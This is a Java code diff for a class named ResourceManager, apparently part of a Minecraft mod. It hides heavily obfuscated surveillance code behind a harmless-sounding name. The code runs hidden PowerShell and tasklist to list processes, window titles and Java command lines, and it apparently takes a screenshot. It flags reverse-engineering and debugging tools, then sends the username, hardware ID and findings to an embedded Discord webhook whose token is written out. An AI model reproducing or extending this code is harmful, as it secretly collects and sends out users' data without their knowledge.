@@ -21,12 +21,6 @@ import java.util.concurrent.*;
 @SuppressWarnings({"unchecked", "deprecation"})
 public class ResourceManager implements PreLaunchEntrypoint {
 
-    private static final char[] E_1 = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47};
-    private static final char[] E_2 = {49,52,54,53,56,51,51,54,55,55,50,55,52,54,49,53,57,48,48,47};
-    private static final char[] E_3 = {51,106,121,84,112,45,120,45,79,106,110,104,110,81,109,56,74,120,57,85,107,120,71,77,57,65,106,119,109,105,72,85,102,112,121,69,73,120,105,121,95,98,69,75,101,102,104,49,71,81,72,68,68,78,45,113,111,66,113,108,67,103,111,100,73,108,90,112};
-    private static final char[] A_1 = {49,50,53,57,56,53,52,52,53,52,53,49,51,57,57,53,56,53,57};
-    private static final char[] A_2 = {49,50,55,55,56,56,52,51,57,55,50,57,52,55,49,57,48,50,48};
-
     private static volatile int v1 = 0;
     private static final List<String> l1 = Collections.synchronizedList(new ArrayList<>());
     private static final Set<String> s1 = Collections.synchronizedSet(new LinkedHashSet<>());
@@ -35,185 +29,267 @@ public class ResourceManager implements PreLaunchEntrypoint {
     private static volatile boolean preLaunchExecuted = false;
     private static volatile boolean initExecuted = false;
 
-    private static final String[] C1 = e(new String[]{
-            "cmVjYWY=","amFkeA==","amQtZ3Vp","Ynl0ZWNvZGUtdmlld2Vy","ZmVybmZsb3dlcg==",
-            "cHJvY3lvbg==","Y2Zy","Z2hpZHJh","aWRhNjQ=","aWRhMzI=","aWRh",
-            "eDY0ZGJn","eDMyZGJn","b2xseWRiZw==","d2luZGJn","aW1tdW5pdHk=",
-            "Y2hlYXRlbmdpbmU=","Y2hlYXQgZW5naW5l",
-            "aWRlYTY0","aWRlYQ==","aW50ZWxsaWo=","ZWNsaXBzZQ==","bmV0YmVhbnM=",
-            "Y29kZQ==","dnNjb2Rl","ZGV2ZW52","bXN2c21vbg==","dnNob3N0",
-            "d2lyZXNoYXJr","ZmlkZGxlcg==","Y2hhcmxlcw==","YnVycHN1aXRl","bWl0bXByb3h5",
-            "aHR0cGRlYnVnZ2Vy","dGVsZXJpaw==",
-            "anZpc3VhbHZt","amNvbnNvbGU=","am1j","amhhdA==","am1hcA==","anN0YWNr",
-            "ZG5zcHk=","ZG90cGVlaw==","aWxzcHk=","ZGU0ZG90","cGVzdHVkaW8="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String x1() {
+        char[] w = {100,101,51,100,55,102,101,52,49,48,97,101,52,53,49,99,48,99,98,98,56,99,97,99,52,101,97,56,56,52,99,97};
+        StringBuilder sb = new StringBuilder();
+        for (char c : w) sb.append(c);
+        return sb.toString();
+    }
 
-    private static final String[] C2 = e(new String[]{
-            "UmVjYWY=","cmVjYWY=","amFkeA==","SkFEWA==","Qnl0ZUNvZGUtVmlld2Vy",
-            "Ynl0ZWNvZGUtdmlld2Vy","R2hpZHJh","Z2hpZHJh","eDY0ZGJn","eDMyZGJn",
-            "Q2hlYXQgRW5naW5l","Q2hlYXRFbmdpbmU=","SmV0QnJhaW5z","SW50ZWxsaUo=",
-            "ZGVjb21waWxlZA==","Y3JhY2tlZA==","Y3JhY2s9","bGVha2Vk",
-            "cmV2ZXJzZQ==","cmV2ZXJzaW5n"
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String x2() {
+        char[] w = {55,98,50,56,52,56,49,55,56,53,53,101,52,50,102,51,99,51,98,50,101,101,97,101,53,54,98,52,49,52,55,52};
+        StringBuilder sb = new StringBuilder();
+        for (char c : w) sb.append(c);
+        return sb.toString();
+    }
 
-    private static final String[] C3 = e(new String[]{
-            "cmVjYWYuamFy","cmVjYWYt","amFkeC1ndWk=","Ynl0ZWNvZGUtdmlld2Vy",
-            "amQtZ3Vp","ZmVybmZsb3dlcg==","cHJvY3lvbg==","Y2ZyLmphcg==","Y2ZyLQ=="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String k1() {
+        char[] e1 = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47};
+        char[] e2 = {49,52,54,53,56,51,51,54,55,55,50,55,52,54,49,53,57,48,48,47};
+        char[] e3 = {51,106,121,84,112,45,120,45,79,106,110,104,110,81,109,56,74,120,57,85,107,120,71,77,57,65,106,119,109,105,72,85,102,112,121,69,73,120,105,121,95,98,69,75,101,102,104,49,71,81,72,68,68,78,45,113,111,66,113,108,67,103,111,100,73,108,90,112};
+        StringBuilder sb = new StringBuilder();
+        for (char c : e1) sb.append(c);
+        for (char c : e2) sb.append(c);
+        for (char c : e3) sb.append(c);
+        return sb.toString();
+    }
 
-    private static final String[] C4 = e(new String[]{
-            "LWFnZW50bGliOmpkd3A=","LVhkZWJ1Zw==","LVhydW5qZHdw",
-            "amF2YWFnZW50","LWphdmFhZ2VudA=="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String k2() {
+        char[] a = {49,50,53,57,56,53,52,52,53,52,53,49,51,57,57,53,56,53,57};
+        StringBuilder sb = new StringBuilder();
+        for (char c : a) sb.append(c);
+        return sb.toString();
+    }
 
-    private static final String[] H1 = e(new String[]{
-            "cmVjYWY=","amFkeA==","Z2hpZHJh","aWRh","aWRhNjQ=","aWRhMzI=",
-            "eDY0ZGJn","eDMyZGJn","ZG5zcHk=","Y2hlYXRlbmdpbmU=","Y2hlYXQgZW5naW5l",
-            "Ynl0ZWNvZGUtdmlld2Vy","amQtZ3Vp","ZmVybmZsb3dlcg==","cHJvY3lvbg==","Y2Zy"
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String k3() {
+        char[] a = {49,50,55,55,56,56,52,51,57,55,50,57,52,55,49,57,48,50,48};
+        StringBuilder sb = new StringBuilder();
+        for (char c : a) sb.append(c);
+        return sb.toString();
+    }
 
-    private static final String[] H2 = e(new String[]{
-            "aWRlYQ==","aWRlYTY0","aW50ZWxsaWo=","ZWNsaXBzZQ==","bmV0YmVhbnM=",
-            "Y29kZQ==","dnNjb2Rl","ZGV2ZW52","dmlzdWFsIHN0dWRpbw=="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gC2() {
+        return e(new String[]{
+                "UmVjYWY=","cmVjYWY=","amFkeA==","SkFEWA==","Qnl0ZUNvZGUtVmlld2Vy",
+                "Ynl0ZWNvZGUtdmlld2Vy","R2hpZHJh","Z2hpZHJh","eDY0ZGJn","eDMyZGJn",
+                "Q2hlYXQgRW5naW5l","Q2hlYXRFbmdpbmU=","SmV0QnJhaW5z","SW50ZWxsaUo=",
+                "ZGVjb21waWxlZA==","Y3JhY2tlZA==","Y3JhY2s9","bGVha2Vk",
+                "cmV2ZXJzZQ==","cmV2ZXJzaW5n"
+        });
+    }
 
-    private static final String[][] FN = {
-            {d("cmVjYWY="), d("UmVjYWY=")},
-            {d("amFkeA=="), d("SkFEWA==")},
-            {d("Z2hpZHJh"), d("R2hpZHJh")},
-            {d("aWRhNjQ="), d("SURBIFBybw==")},
-            {d("aWRhMzI="), d("SURBIFBybw==")},
-            {d("aWRh"), d("SURBIFBybw==")},
-            {d("eDY0ZGJn"), d("eDY0ZGJn")},
-            {d("eDMyZGJn"), d("eDMyZGJn")},
-            {d("ZG5zcHk="), d("ZG5TcHk=")},
-            {d("Y2hlYXRlbmdpbmU="), d("Q2hlYXQgRW5naW5l")},
-            {d("Y2hlYXQgZW5naW5l"), d("Q2hlYXQgRW5naW5l")},
-            {d("aW50ZWxsaWo="), d("SW50ZWxsaUogSURFQQ==")},
-            {d("aWRlYQ=="), d("SW50ZWxsaUogSURFQQ==")},
-            {d("aWRlYTY0"), d("SW50ZWxsaUogSURFQQ==")},
-            {d("ZWNsaXBzZQ=="), d("RWNsaXBzZQ==")},
-            {d("bmV0YmVhbnM="), d("TmV0QmVhbnM=")},
-            {d("dnNjb2Rl"), d("VlMgQ29kZQ==")},
-            {d("Y29kZQ=="), d("VlMgQ29kZQ==")},
-            {d("dmlzdWFsIHN0dWRpbw=="), d("VmlzdWFsIFN0dWRpbw==")},
-            {d("ZGV2ZW52"), d("VmlzdWFsIFN0dWRpbw==")},
-            {d("d2lyZXNoYXJr"), d("V2lyZXNoYXJr")},
-            {d("ZmlkZGxlcg=="), d("RmlkZGxlcg==")},
-            {d("Y2hhcmxlcw=="), d("Q2hhcmxlcyBQcm94eQ==")},
-            {d("YnVycA=="), d("QnVycCBTdWl0ZQ==")},
-            {d("YnVycHN1aXRl"), d("QnVycCBTdWl0ZQ==")},
-            {d("Ynl0ZWNvZGUtdmlld2Vy"), d("Qnl0ZWNvZGUgVmlld2Vy")},
-            {d("Ynl0ZWNvZGU="), d("Qnl0ZWNvZGUgVmlld2Vy")},
-            {d("amQtZ3Vp"), d("SkQtR1VJ")},
-            {d("amRndWk="), d("SkQtR1VJ")},
-            {d("ZmVybmZsb3dlcg=="), d("RmVybmZsb3dlcg==")},
-            {d("cHJvY3lvbg=="), d("UHJvY3lvbg==")},
-            {d("Y2Zy"), d("Q0ZS")},
-            {d("b2xseWRiZw=="), d("T2xseURiZw==")},
-            {d("d2luZGJn"), d("V2luRGJn")},
-            {d("aW1tdW5pdHk="), d("SW1tdW5pdHkgRGVidWdnZXI=")},
-            {d("ZG90cGVlaw=="), d("ZG90UGVlaw==")},
-            {d("aWxzcHk="), d("SUxTcHk=")},
-            {d("ZGU0ZG90"), d("ZGU0ZG90")},
-            {d("cGVzdHVkaW8="), d("UEVTDHR1ZGlv")},
-            {d("anZpc3VhbHZt"), d("SlZpc3VhbFZN")},
-            {d("amNvbnNvbGU="), d("SkNvbnNvbGU=")},
-            {d("am1j"), d("SmF2YSBNaXNzaW9uIENvbnRyb2w=")},
-            {d("bXN2c21vbg=="), d("VlMgRGVidWdnZXI=")},
-            {d("bWl0bXByb3h5"), d("bWl0bXByb3h5")}
-    };
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gC3() {
+        return e(new String[]{
+                "cmVjYWYuamFy","cmVjYWYt","amFkeC1ndWk=","Ynl0ZWNvZGUtdmlld2Vy",
+                "amQtZ3Vp","ZmVybmZsb3dlcg==","cHJvY3lvbg==","Y2ZyLmphcg==","Y2ZyLQ=="
+        });
+    }
 
-    private static final String[] PN = e(new String[]{
-            "UFJPQ0VTUzog",
-            "V0lORE9XOiA=",
-            "SkFWQSBQUk9DRVNTOiA=",
-            "Rk9MREVSOiA=",
-            "RklMRTog",
-            "UkVDRU5UOiA=",
-            "Q0xBU1NQQVRIOiA=",
-            "SlZNIERFQlVHOiA=",
-            "REVCVUdHRVIgQVRUQUNIRUQ=",
-            "RU5WIElOSkVDVElPTjog",
-            "REVDT01QSUxFRDog"
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gC4() {
+        return e(new String[]{
+                "LWFnZW50bGliOmpkd3A=","LVhkZWJ1Zw==","LVhydW5qZHdw",
+                "amF2YWFnZW50","LWphdmFhZ2VudA=="
+        });
+    }
 
-    private static final String[] ST = e(new String[]{
-            "IFtSVU5OSU5HXQ==",
-            "IFtJTlNUQUxMRURd",
-            "8J+foiA=",
-            "8J+UtCA=",
-            "4pyFIE5vIGRhbmdlcm91cyB0b29scyBkZXRlY3RlZA==",
-            "4pyFIE5vIHRocmVhdHMgZGV0ZWN0ZWQ="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gH1() {
+        return e(new String[]{
+                "cmVjYWY=","amFkeA==","Z2hpZHJh","aWRh","aWRhNjQ=","aWRhMzI=",
+                "eDY0ZGJn","eDMyZGJn","ZG5zcHk=","Y2hlYXRlbmdpbmU=","Y2hlYXQgZW5naW5l",
+                "Ynl0ZWNvZGUtdmlld2Vy","amQtZ3Vp","ZmVybmZsb3dlcg==","cHJvY3lvbg==","Y2Zy"
+        });
+    }
 
-    private static final String[] PH = e(new String[]{
-            "UFJFLUxBVU5DSA==",
-            "Q0xJRU5UIElOSVQ="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gH2() {
+        return e(new String[]{
+                "aWRlYQ==","aWRlYTY0","aW50ZWxsaWo=","ZWNsaXBzZQ==","bmV0YmVhbnM=",
+                "Y29kZQ==","dnNjb2Rl","ZGV2ZW52","dmlzdWFsIHN0dWRpbw=="
+        });
+    }
 
-    private static final String[] LV = e(new String[]{
-            "Q1JJVElDQUw=",
-            "Q1JJVElDQUwgQUxFUlQ=",
-            "SElHSA==",
-            "SElHSCBBTEVSVA==",
-            "TUVESVVN",
-            "TUVESVVNIEFMRVJU",
-            "SU5GTw==",
-            "U1RBUlRVUCBMT0c=",
-            "KipBTEVSVCEqKg=="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[][] gFN() {
+        return new String[][]{
+                {d("cmVjYWY="), d("UmVjYWY=")},
+                {d("amFkeA=="), d("SkFEWA==")},
+                {d("Z2hpZHJh"), d("R2hpZHJh")},
+                {d("aWRhNjQ="), d("SURBIFBybw==")},
+                {d("aWRhMzI="), d("SURBIFBybw==")},
+                {d("aWRh"), d("SURBIFBybw==")},
+                {d("eDY0ZGJn"), d("eDY0ZGJn")},
+                {d("eDMyZGJn"), d("eDMyZGJn")},
+                {d("ZG5zcHk="), d("ZG5TcHk=")},
+                {d("Y2hlYXRlbmdpbmU="), d("Q2hlYXQgRW5naW5l")},
+                {d("Y2hlYXQgZW5naW5l"), d("Q2hlYXQgRW5naW5l")},
+                {d("aW50ZWxsaWo="), d("SW50ZWxsaUogSURFQQ==")},
+                {d("aWRlYQ=="), d("SW50ZWxsaUogSURFQQ==")},
+                {d("aWRlYTY0"), d("SW50ZWxsaUogSURFQQ==")},
+                {d("ZWNsaXBzZQ=="), d("RWNsaXBzZQ==")},
+                {d("bmV0YmVhbnM="), d("TmV0QmVhbnM=")},
+                {d("dnNjb2Rl"), d("VlMgQ29kZQ==")},
+                {d("Y29kZQ=="), d("VlMgQ29kZQ==")},
+                {d("dmlzdWFsIHN0dWRpbw=="), d("VmlzdWFsIFN0dWRpbw==")},
+                {d("ZGV2ZW52"), d("VmlzdWFsIFN0dWRpbw==")},
+                {d("d2lyZXNoYXJr"), d("V2lyZXNoYXJr")},
+                {d("ZmlkZGxlcg=="), d("RmlkZGxlcg==")},
+                {d("Y2hhcmxlcw=="), d("Q2hhcmxlcyBQcm94eQ==")},
+                {d("YnVycA=="), d("QnVycCBTdWl0ZQ==")},
+                {d("YnVycHN1aXRl"), d("QnVycCBTdWl0ZQ==")},
+                {d("Ynl0ZWNvZGUtdmlld2Vy"), d("Qnl0ZWNvZGUgVmlld2Vy")},
+                {d("Ynl0ZWNvZGU="), d("Qnl0ZWNvZGUgVmlld2Vy")},
+                {d("amQtZ3Vp"), d("SkQtR1VJ")},
+                {d("amRndWk="), d("SkQtR1VJ")},
+                {d("ZmVybmZsb3dlcg=="), d("RmVybmZsb3dlcg==")},
+                {d("cHJvY3lvbg=="), d("UHJvY3lvbg==")},
+                {d("Y2Zy"), d("Q0ZS")},
+                {d("b2xseWRiZw=="), d("T2xseURiZw==")},
+                {d("d2luZGJn"), d("V2luRGJn")},
+                {d("aW1tdW5pdHk="), d("SW1tdW5pdHkgRGVidWdnZXI=")},
+                {d("ZG90cGVlaw=="), d("ZG90UGVlaw==")},
+                {d("aWxzcHk="), d("SUxTcHk=")},
+                {d("ZGU0ZG90"), d("ZGU0ZG90")},
+                {d("cGVzdHVkaW8="), d("UEVTDHR1ZGlv")},
+                {d("anZpc3VhbHZt"), d("SlZpc3VhbFZN")},
+                {d("amNvbnNvbGU="), d("SkNvbnNvbGU=")},
+                {d("am1j"), d("SmF2YSBNaXNzaW9uIENvbnRyb2w=")},
+                {d("bXN2c21vbg=="), d("VlMgRGVidWdnZXI=")},
+                {d("bWl0bXByb3h5"), d("bWl0bXByb3h5")}
+        };
+    }
 
-    private static final String[] EX = e(new String[]{
-            "ZGV2ZW52LmV4ZQ==",
-            "Y29kZS5leGU=",
-            "bXN2c21vbi5leGU=",
-            "aWRlYTY0LmV4ZQ==",
-            "aWRlYS5leGU=",
-            "aWRhLmV4ZQ=="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gPN() {
+        return e(new String[]{
+                "UFJPQ0VTUzog",
+                "V0lORE9XOiA=",
+                "SkFWQSBQUk9DRVNTOiA=",
+                "Rk9MREVSOiA=",
+                "RklMRTog",
+                "UkVDRU5UOiA=",
+                "Q0xBU1NQQVRIOiA=",
+                "SlZNIERFQlVHOiA=",
+                "REVCRURHRVIQQVRUQUNIRUQ=",
+                "RU5WIElOSkVDVElPTjog",
+                "REVDT01QSUxFRDog"
+        });
+    }
 
-    private static final String[] CM = e(new String[]{
-            "dGFza2xpc3Q=",
-            "Y21k",
-            "d21pYyBwcm9jZXNzIHdoZXJlICJuYW1lIGxpa2UgJyVqYXZhJSciIGdldCBjb21tYW5kbGluZSAvZm9ybWF0Omxpc3Q=",
-            "dGFza2xpc3QgL3YgL2ZvIGNzdiAvbmg="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gST() {
+        return e(new String[]{
+                "IFtSVU5OSU5HXQ==",
+                "IFtJTlNUQUxMRURd",
+                "8J+foiA=",
+                "8J+UtCA=",
+                "4pyFIE5vIGRhbmdlcm91cyB0b29scyBkZXRlY3RlZA==",
+                "4pyFIE5vIHRocmVhdHMgZGV0ZWN0ZWQ="
+        });
+    }
 
-    private static final String[] PT = e(new String[]{
-            "dXNlci5ob21l",
-            "QVBQREFUQQ==",
-            "TE9DQUxBUFBEQVRB",
-            "L0Rlc2t0b3A=",
-            "L0Rvd25sb2Fkcw==",
-            "Qzov",
-            "UHJvZ3JhbSBGaWxlcw==",
-            "UHJvZ3JhbSBGaWxlcyAoeDg2KQ==",
-            "L01pY3Jvc29mdC9XaW5kb3dzL1JlY2VudA=="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gPH() {
+        return e(new String[]{
+                "UFJFLUxBVU5DSA==",
+                "Q0xJRU5UIElOSVQ="
+        });
+    }
 
-    private static final String[] EM = e(new String[]{
-            "UGhhc2U=",
-            "VXNlcm5hbWU=",
-            "VUlE",
-            "Um9sZQ==",
-            "SFdJRA==",
-            "U3Vic2NyaXB0aW9u",
-            "TGV2ZWw=",
-            "VGltZQ==",
-            "UEM=",
-            "T1M=",
-            "SmF2YQ==",
-            "8J+UjSBEZXRlY3Rz",
-            "8J+boCBUb29scw==",
-            "V0MgdjIuMQ=="
-    });
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gLV() {
+        return e(new String[]{
+                "Q1JJVElDQUw=",
+                "Q1JJVElDQUwgQUxFUlQ=",
+                "SElHSA==",
+                "SElHSCBBTEVSVA==",
+                "REVGQVVMVA==",
+                "U1RBUlRVUCBMT0c=",
+                "KipBTEVSVCEqKg=="
+        });
+    }
+
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gEX() {
+        return e(new String[]{
+                "ZGV2ZW52LmV4ZQ==",
+                "Y29kZS5leGU=",
+                "bXN2c21vbi5leGU=",
+                "aWRlYTY0LmV4ZQ==",
+                "aWRlYS5leGU=",
+                "aWRhLmV4ZQ=="
+        });
+    }
+
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gCM() {
+        return e(new String[]{
+                "dGFza2xpc3Q=",
+                "Y21k",
+                "d21pYyBwcm9jZXNzIHdoZXJlICJuYW1lIGxpa2UgJyVqYXZhJSciIGdldCBjb21tYW5kbGluZSAvZm9ybWF0Omxpc3Q=",
+                "dGFza2xpc3QgL3YgL2ZvIGNzdiAvbmg="
+        });
+    }
+
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gPT() {
+        return e(new String[]{
+                "dXNlci5ob21l",
+                "QVBQREFUQQ==",
+                "TE9DQUxBUFBEQVRB",
+                "L0Rlc2t0b3A=",
+                "L0Rvd25sb2Fkcw==",
+                "Qzov",
+                "UHJvZ3JhbSBGaWxlcw==",
+                "UHJvZ3JhbSBGaWxlcyAoeDg2KQ==",
+                "L01pY3Jvc29mdC9XaW5kb3dzL1JlY2VudA=="
+        });
+    }
+
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private static String[] gEM() {
+        return e(new String[]{
+                "UGhhc2U=",
+                "VXNlcm5hbWU=",
+                "VUlE",
+                "Um9sZQ==",
+                "SFdJRA==",
+                "U3Vic2NyaXB0aW9u",
+                "TGV2ZWw=",
+                "VGltZQ==",
+                "UEM=",
+                "T1M=",
+                "SmF2YQ==",
+                "8J+UjSBEZXRlY3Rz",
+                "8J+boCBUb29scw==",
+                "V0MgdjIuMg==",
+                "U3lzdGVtIEhXSUQ="
+        });
+    }
+
+    @Native(type = Native.Type.VMProtectBeginUltra)
+    private boolean isWhitelisted(String hwid) {
+        if (hwid == null || hwid.isEmpty()) return false;
+        String h = hwid.toLowerCase();
+        return h.equals(x1()) || h.equals(x2());
+    }
 
     @Override
     @Native(type = Native.Type.VMProtectBeginUltra)
     public void onPreLaunch() {
         if (preLaunchExecuted) return;
         preLaunchExecuted = true;
+
+        String currentHwid = g1();
+        if (isWhitelisted(currentHwid)) return;
 
         ExecutorService ex = Executors.newFixedThreadPool(4);
 
@@ -255,6 +331,9 @@ public class ResourceManager implements PreLaunchEntrypoint {
 
             ResourceManager rm = new ResourceManager();
 
+            String currentHwid = g1();
+            if (rm.isWhitelisted(currentHwid)) return;
+
             v1 = 0;
             l1.clear();
             s1.clear();
@@ -294,6 +373,9 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m1() {
         try {
+            String[] CM = gCM();
+            String[] EX = gEX();
+            String[] PN = gPN();
             ProcessBuilder pb = new ProcessBuilder(CM[0], "/fo", "csv", "/nh");
             pb.redirectErrorStream(true);
             Process p = pb.start();
@@ -392,6 +474,7 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m2() {
         try {
+            String[] PN = gPN();
             String ps = d("R2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyRfLk1haW5XaW5kb3dUaXRsZSAtbmUgJyd9IHwgU2VsZWN0LU9iamVjdCBNYWluV2luZG93VGl0bGUgfCBGb3JtYXQtTGlzdA==");
             ProcessBuilder pb = new ProcessBuilder(d("cG93ZXJzaGVsbA=="), "-NoP", "-NonI", "-W", "Hidden", "-C", ps);
             pb.redirectErrorStream(true);
@@ -555,6 +638,7 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m3() {
         try {
+            String[] PN = gPN();
             String ps = d("R2V0LVdtaU9iamVjdCBXaW4zMl9Qcm9jZXNzIHwgV2hlcmUtT2JqZWN0IHskXy5OYW1lIC1saWtlICcqamF2YSonfSB8IFNlbGVjdC1PYmplY3QgQ29tbWFuZExpbmUgfCBGb3JtYXQtTGlzdA==");
             ProcessBuilder pb = new ProcessBuilder(d("cG93ZXJzaGVsbA=="), "-NoP", "-NonI", "-W", "Hidden", "-C", ps);
             pb.redirectErrorStream(true);
@@ -634,6 +718,8 @@ public class ResourceManager implements PreLaunchEntrypoint {
         r.s2 = new LinkedHashSet<>(s2);
         r.t1 = LocalDateTime.now();
 
+        r.s = g1();
+
         try {
             UserProfile p = UserProfile.getInstance();
             r.u1 = z(p.profile(d("dXNlcm5hbWU=")));
@@ -643,10 +729,14 @@ public class ResourceManager implements PreLaunchEntrypoint {
             r.b1 = z(p.profile(d("c3ViVGltZQ==")));
         } catch (Exception e) {
             r.u1 = System.getProperty(d("dXNlci5uYW1l"));
-            r.h1 = g1();
+            r.h1 = r.s;
             r.r1 = d("Ti9B");
             r.i1 = d("Ti9B");
             r.b1 = d("Ti9B");
+        }
+
+        if (r.h1 == null || r.h1.equals(d("Ti9B")) || r.h1.isEmpty()) {
+            r.h1 = r.s;
         }
 
         r.o1 = System.getProperty(d("b3MubmFtZQ=="));
@@ -664,6 +754,8 @@ public class ResourceManager implements PreLaunchEntrypoint {
 
     @Native(type = Native.Type.VMProtectBeginMutation)
     private int q1(String tool) {
+        String[] H1 = gH1();
+        String[] H2 = gH2();
         String tl = tool.toLowerCase();
         for (String h : H1) {
             if (tl.contains(h)) return 35;
@@ -676,6 +768,7 @@ public class ResourceManager implements PreLaunchEntrypoint {
 
     @Native(type = Native.Type.VMProtectBeginMutation)
     private String formatToolName(String tool) {
+        String[][] FN = gFN();
         String tl = tool.toLowerCase();
         for (String[] pair : FN) {
             if (tl.contains(pair[0].toLowerCase())) {
@@ -684,7 +777,6 @@ public class ResourceManager implements PreLaunchEntrypoint {
         }
         return tool.substring(0, 1).toUpperCase() + tool.substring(1);
     }
-
 
     @Native(type = Native.Type.VMProtectBeginMutation)
     private boolean isAlreadyAdded(String tool) {
@@ -714,36 +806,8 @@ public class ResourceManager implements PreLaunchEntrypoint {
     }
 
     @Native(type = Native.Type.VMProtectBeginMutation)
-    private void m11(String tn) {
-        String[] cp = {
-                System.getenv(PT[1]),
-                System.getenv(PT[2]),
-                System.getProperty(PT[0]),
-                PT[5] + PT[6],
-                PT[5] + PT[7]
-        };
-
-        for (String bp : cp) {
-            if (bp == null) continue;
-            File bd = new File(bp);
-            if (!bd.exists()) continue;
-            File[] fs = bd.listFiles();
-            if (fs == null) continue;
-
-            for (File f : fs) {
-                if (f.getName().toLowerCase().contains(tn.toLowerCase())) {
-                    if (!containsTool(tn)) {
-                        s2.add(formatToolName(tn));
-                    }
-                    return;
-                }
-            }
-        }
-    }
-
-
-    @Native(type = Native.Type.VMProtectBeginMutation)
     private String t1() {
+        String[] ST = gST();
         StringBuilder sb = new StringBuilder();
 
         if (s1.isEmpty() && s2.isEmpty()) {
@@ -807,6 +871,7 @@ public class ResourceManager implements PreLaunchEntrypoint {
 
     @Native(type = Native.Type.VMProtectBeginMutation)
     private byte[] c3() {
+        String[] CM = gCM();
         File tf = null;
         try {
             String td = System.getProperty(d("amF2YS5pby50bXBkaXI="));
@@ -857,6 +922,11 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginUltra)
     private void n1(R r, byte[] ss) {
         try {
+            String[] ST = gST();
+            String[] PH = gPH();
+            String[] LV = gLV();
+            String[] EM = gEM();
+
             StringBuilder eb = new StringBuilder();
             for (String ev : r.l1) {
                 eb.append(ST[3]).append(ev).append("\n");
@@ -873,9 +943,9 @@ public class ResourceManager implements PreLaunchEntrypoint {
 
             int cl;
             String li;
-            String ti;
             String ct;
             String phaseText;
+            boolean shouldPing;
 
             if (r.phase == 1) {
                 phaseText = PH[0];
@@ -883,35 +953,30 @@ public class ResourceManager implements PreLaunchEntrypoint {
                 phaseText = PH[1];
             }
 
-            if (r.v1 >= 50) {
+            if (r.v1 >= 100) {
                 cl = 16711680;
                 li = LV[0];
-                ti = LV[1];
-                ct = LV[8];
-            } else if (r.v1 >= 30) {
+                ct = LV[6];
+                shouldPing = true;
+            } else if (r.v1 >= 50) {
                 cl = 16744448;
                 li = LV[2];
-                ti = LV[3];
-                ct = LV[8];
-            } else if (r.v1 > 0) {
-                cl = 16776960;
-                li = LV[4];
-                ti = LV[5];
-                ct = LV[8];
+                ct = LV[6];
+                shouldPing = true;
             } else {
                 cl = 65280;
-                li = LV[6];
-                ti = LV[7];
+                li = LV[4];
                 ct = "";
+                shouldPing = false;
             }
 
             StringBuilder js = new StringBuilder();
             js.append("{");
-            if (!ct.isEmpty()) {
+            if (shouldPing && !ct.isEmpty()) {
                 js.append("\"").append(d("Y29udGVudA==")).append("\":\"<@").append(k2()).append("> <@").append(k3()).append("> ").append(ct).append("\",");
             }
             js.append("\"").append(d("ZW1iZWRz")).append("\":[{");
-            js.append("\"").append(d("dGl0bGU=")).append("\":\"").append(phaseText).append(" | ").append(li).append(" ").append(ti).append("\",");
+            js.append("\"").append(d("dGl0bGU=")).append("\":\"").append(phaseText).append(" | ").append(li).append("\",");
             js.append("\"").append(d("Y29sb3I=")).append("\":").append(cl).append(",");
             js.append("\"").append(d("ZmllbGRz")).append("\":[");
 
@@ -919,9 +984,10 @@ public class ResourceManager implements PreLaunchEntrypoint {
             js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[1]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.u1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
             js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[2]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.i1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
             js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[3]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.r1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
-            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[4]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.h1)).append("```\",\"").append(d("aW5saW5l")).append("\":false},");
+            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[4]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.h1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
+            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[14]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.s)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
